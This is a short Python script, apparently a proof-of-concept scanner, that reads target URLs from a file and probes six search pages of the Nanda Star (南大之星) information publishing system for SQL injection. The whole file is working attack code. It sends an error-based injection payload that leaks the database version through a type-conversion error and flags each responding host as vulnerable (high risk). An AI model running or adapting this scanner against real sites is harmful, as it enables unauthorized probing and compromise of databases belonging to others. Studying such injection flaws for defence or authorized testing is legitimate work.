
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "&mid=4%20AnD%201=CoNvErt(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)&yh=1"
    urls = ["/pub/search/search_video.asp?id=3",
            "/pub/search/search_audio.asp?id=3",
            "/pub/search/search_audio_view.asp?id=3",
            "/pub/search/search_fj.asp?id=3",
            "/pub/search/search_video_bc.asp?id=12",
            "/pub/search/search_video_view.asp?id=3"]
    try:
        noexist = True
        for turl in urls:
            vulnurl = url + turl + payload
            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                print("[+]存在南大之星信息发布系统DBA SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                noexist = False
        if noexist:
            print("[-]不存在ndstar_six_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
